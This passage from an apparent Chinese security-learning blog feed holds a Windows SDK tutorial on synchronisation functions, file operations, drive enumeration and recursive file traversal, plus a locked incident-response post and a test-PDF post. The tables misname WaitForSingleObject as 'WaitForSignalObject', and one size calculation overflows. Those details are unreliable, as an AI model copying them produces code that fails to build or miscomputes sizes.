class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(<span class="number">14</span>, hThread, TRUE, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>原子操作，只能保证对于基本算数操作是原子性的。</p><p>临界区和互斥体从词语的含义上看，他们主要就是为了解决互斥问题。</p><p>临界区的优点是快。互斥体的优点是能够跨进程访问，崩溃不死锁。</p><p>事件 从词语的含义上看，更适合做通知（产生了一个事件）。比较适合解决有先后顺序的多线程问题。</p><p>事件和互斥体的最大区别，就是线程所有权。互斥体谁上锁，谁开锁。事件没有这个要求。</p><p>信号量，由于存在信号数的问题，比较适合解决多线程的协调问题。典型问题，就是生产者消费者问题。</p><h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><p>原子操作：</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InterlockedIncrement</td><td>自增</td><td>InterlockedIncrement(&amp;g_count)</td></tr><tr><td>InterlockedDecrement</td><td>自减</td><td>InterlockedDecrement(&amp;g_count);</td></tr><tr><td>InterlockedExchangeAdd</td><td>加法/减法</td><td>InterlockedExchangeAdd(&amp;g_count, 256L);</td></tr><tr><td>InterlockedExchange</td><td>赋值</td><td>InterlockedExchange(&amp;g_count, 256L);</td></tr></tbody></table></div><p>临界区</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>InitializeCriticalSection</td><td>初始化</td><td></td></tr><tr><td>DeleteCriticalSection</td><td>销毁</td><td></td></tr><tr><td>EnterCriticalSection</td><td>进入临界区</td><td></td></tr><tr><td>LeaveCriticalSection</td><td>离开临界区</td></tr></tbody></table></div><p>互斥体</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateMutex</td><td>创建互斥体</td><td>可以给互斥体起名字</td></tr><tr><td>OpenMutex</td><td>打开互斥体，得到句柄</td><td>根据名字才能打开互斥体</td></tr><tr><td>ReleaseMutex</td><td>释放互斥体</td><td>会使得互斥体处于激发态</td></tr><tr><td>CloseHandle</td><td>关闭句柄</td><td>使用完后关闭</td></tr><tr><td>WaitForSignalObject</td><td>等待互斥体处于激发态</td><td>等到激发态后，会使得互斥体再次处于非激发态</td></tr></tbody></table></div><p>事件</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateEvent</td><td>创建事件</td><td>可以给事件起名字 可以设置两种模式：手工 自动</td></tr><tr><td>OpenEvent</td><td>打开事件，得到句柄</td><td>根据名字才能打开事件</td></tr><tr><td>SetEvent</td><td>释放事件</td><td>会使得事件处于激发态</td></tr><tr><td>ResetEvent</td><td>重置事件</td><td>会使得事件处于非激发态，对手工模式的事件有效</td></tr><tr><td>WaitForSignalObject</td><td>等待事件处于激发态</td><td>等到激发态后，对于自动模式的事件会使其再次处于非激发态</td></tr></tbody></table></div><p>信号量</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>CreateSemaphore</td><td>创建信号量</td><td>可以给信号量起名字 可以指定最大信号数和当前信号数</td></tr><tr><td>OpenSemaphore</td><td>打开信号量</td><td>根据名字才能打开信号量</td></tr><tr><td>ReleaseSemaphore</td><td>释放信号量</td><td>会增加信号量的信号数，但是不会超过最大信号数</td></tr><tr><td>WaitForSignalObject</td><td>等待信号量处于激发态</td><td>若处于激发态，则会减少1个信号数，信号数位0，将其置为非激发态</td></tr></tbody></table></div><h1 id="九、文件操作"><a href="#九、文件操作" class="headerlink" title="九、文件操作"></a>九、文件操作</h1><div class="table-container"><table><thead><tr><th>DeleteFile</th><th>删除文件</th></tr></thead><tbody><tr><td>CopyFile</td><td>拷贝文件</td></tr><tr><td>MoveFile</td><td>移动文件</td></tr><tr><td>CreateFile</td><td>打开文件</td></tr><tr><td>GetFileSize</td><td>获取文件大小</td></tr><tr><td>ReadFile</td><td>读取文件</td></tr><tr><td>CloseHandle</td><td>关闭文件</td></tr><tr><td>FindFirstFile</td><td>查找第一个文件</td></tr><tr><td>FindNextFile</td><td>查找下一个文件</td></tr><tr><td>WriteFile</td><td>写入数据</td></tr></tbody></table></div><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyEnumFile</span><span class="params">(<span class="type">const</span> TCHAR * szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WIN32_FIND_DATA wfd = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">HANDLE hFind =  <span class="built_in">FindFirstFile</span>(szPath, &amp;wfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hFind!=INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件夹：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//MyEnumFile();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件：%S\n&quot;</span>, wfd.cFileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hFind, &amp;wfd));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 删除文件</span></span><br><span class="line"><span class="comment">//DeleteFile(_T(&quot;D:\\hehe\\haha.txt&quot;));</span></span><br><span class="line"><span class="comment">//2. 拷贝文件</span></span><br><span class="line"><span class="comment">//CopyFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\123.txt&quot;),TRUE);</span></span><br><span class="line"><span class="comment">//3. 移动文件</span></span><br><span class="line"><span class="comment">//MoveFile(_T(&quot;D:\\hehe\\123\\haha.txt&quot;), _T(&quot;D:\\hehe\\nihao.txt&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 打开文件 进行读写  fread   fwrite</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">_T(<span class="string">&quot;D:/hehe/123/haha.txt&quot;</span>),            <span class="comment">//路径</span></span><br><span class="line">GENERIC_READ | GENERIC_WRITE, <span class="comment">//打开的权限</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//共享模式</span></span><br><span class="line"><span class="literal">NULL</span>,                         <span class="comment">//安全属性</span></span><br><span class="line">OPEN_EXISTING,                <span class="comment">//</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,        <span class="comment">//普通属性</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//获取文件大小，申请相应的缓冲区空间</span></span><br><span class="line">DWORD dwSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="type">char</span>* pbuf = <span class="keyword">new</span> <span class="type">char</span>[dwSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, pbuf, dwSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//5. 查看文件的属性</span></span><br><span class="line"><span class="comment">//5.1 基本属性</span></span><br><span class="line">DWORD dwAttribute = <span class="built_in">GetFileAttributes</span>(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (dwAttribute&amp; FILE_ATTRIBUTE_HIDDEN)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这个文件是隐藏的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dwAttribute &amp; FILE_ATTRIBUTE_READONLY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这个文件是只读的&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">WIN32_FILE_ATTRIBUTE_DATA wfad = &#123;&#125;;</span><br><span class="line"><span class="built_in">GetFileAttributesEx</span>(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>), GetFileExInfoStandard, &amp;wfad);</span><br><span class="line"><span class="comment">//5.2 扩展属性</span></span><br><span class="line">wfad.ftCreationTime;<span class="comment">//这里获取到的是时间戳</span></span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;wfad.ftCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="comment">//6. 枚举某一个文件夹下的文件</span></span><br><span class="line"><span class="built_in">MyEnumFile</span>(_T(<span class="string">&quot;D:\\*&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历盘符"><a href="#遍历盘符" class="headerlink" title="遍历盘符"></a>遍历盘符</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"></span><br><span class="line">DWORD 总容量;</span><br><span class="line">DWORD 空闲容量;</span><br><span class="line"><span class="built_in">GetLogicalDriveStrings</span>(<span class="number">100</span>, buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="type">int</span> Flag = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//wprintf(_T(&quot;%s  &quot;), pTemp);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = Flag;</span><br><span class="line">li.pszText = pTemp;</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = <span class="built_in">GetDriveType</span>(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;可移动设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;硬盘&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;远程设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;光驱&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,</span><br><span class="line">&amp;每簇的扇区数量,</span><br><span class="line">&amp;每个扇区的容量,</span><br><span class="line">&amp;空闲簇的总量,</span><br><span class="line">&amp;全部簇的总量</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Flag++;</span><br><span class="line">pTemp += <span class="built_in">wcslen</span>(buf)+<span class="number">1</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyDlg2::EnumFile</span><span class="params">(CString filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//每次遍历都得置0</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">dwConstSize1 = <span class="number">0</span>;</span><br><span class="line">dwConstSize2 = <span class="number">0</span>;</span><br><span class="line">CString cs;</span><br><span class="line"><span class="comment">// 拼接完整路径</span></span><br><span class="line">CString fullPath = filePath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = <span class="built_in">FindFirstFile</span>(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">wcscmp</span>(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnumFile</span>(filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_FileList.<span class="built_in">InsertItem</span>(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">DWORD dwSize = (fileData.nFileSizeHigh * (MAXDWORD + <span class="number">1</span>))</span><br><span class="line">+ fileData.nFileSizeLow;</span><br><span class="line"><span class="comment">// 转换成字符串格式</span></span><br><span class="line"></span><br><span class="line">cs.<span class="built_in">Format</span>(<span class="string">L&quot;%d kb&quot;</span>, dwSize/<span class="number">1024</span>);</span><br><span class="line">m_FileList.<span class="built_in">SetItemText</span>(i, <span class="number">1</span>, cs);</span><br><span class="line"><span class="comment">// 筛选处指定后缀名的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">wcscmp</span>(<span class="string">L&quot;.exe&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.obj&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.tlog&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.idb&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.pdb&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.pch&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.res&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.ilk&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.sdf&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.ipch&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.log&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line"><span class="built_in">wcscmp</span>(<span class="string">L&quot;.lastbuildstate&quot;</span>, <span class="built_in">PathFindExtension</span>(fileData.cFileName)) == <span class="number">0</span> </span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">CString csPath;<span class="comment">//保存路径到vector中</span></span><br><span class="line">csPath.<span class="built_in">Format</span>(<span class="string">L&quot;%s\\%s&quot;</span> , filePath,fileData.cFileName);</span><br><span class="line"></span><br><span class="line">path.<span class="built_in">push_back</span>(csPath);<span class="comment">//将路径加入vector</span></span><br><span class="line">m_FileList2.<span class="built_in">InsertItem</span>(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line">m_FileList2.<span class="built_in">SetItemText</span>(i, <span class="number">1</span>, cs);</span><br><span class="line"></span><br><span class="line">dwConstSize2 += dwSize / <span class="number">1024</span>;</span><br><span class="line">j ++;</span><br><span class="line">&#125;</span><br><span class="line">dwConstSize1 += dwSize / <span class="number">1024</span>;</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">菜鸡食用指南🤓</summary>
    
    
    
    <category term="Windows安全" scheme="http://example.com/categories/Windows%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SDK" scheme="http://example.com/tags/SDK/"/>
    
  </entry>
  
  <entry>
    <title>Web应急响应工具</title>
    <link href="http://example.com/2022/11/23/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/2022/11/23/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/</id>
    <published>2022-11-23T13:34:23.000Z</published>
    <updated>2022-11-23T13:35:18.355Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ec023c4f2e38992916e495ca08e39f0bb37eda8d5004c0d46c550e55707e674e">48e22157b1ef105701eba779d55791b90cb472c4abb9e1c602a2918b0f53652a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是容易感染的</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">本资源只供学习参考之用，收集与互联网，请勿用于其它用途，本人概不负责。</summary>
    
    
    
    <category term="Web安全" scheme="http://example.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web应急响应工具" scheme="http://example.com/tags/Web%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>测试PDF</title>
    <link href="http://example.com/2022/11/23/%E6%B5%8B%E8%AF%95PDF/"/>
    <id>http://example.com/2022/11/23/%E6%B5%8B%E8%AF%95PDF/</id>
    <published>2022-11-23T12:07:30.000Z</published>
    <updated>2022-11-23T12:14:29.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试PDF"><a href="#测试PDF" class="headerlink" title="测试PDF"></a>测试PDF</h1><p> <a href="测试PDF\CommonsCollections6.pdf">CommonsCollections6.pdf</a> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span> <span class="attr">id</span>=<span class="string">&quot;colortap1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> colortap = <span class="keyword">function</span> (<span class="params">r</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;<span class="keyword">return</span> b[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * b.<span class="property">length</span>)]&#125;  </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">e</span>(<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">94</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>() + <span class="number">33</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">r</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">var</span> n=<span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>(),i=<span class="number">0</span>;r&gt;i;i++)&#123;</span></span><br><span class="line"><span 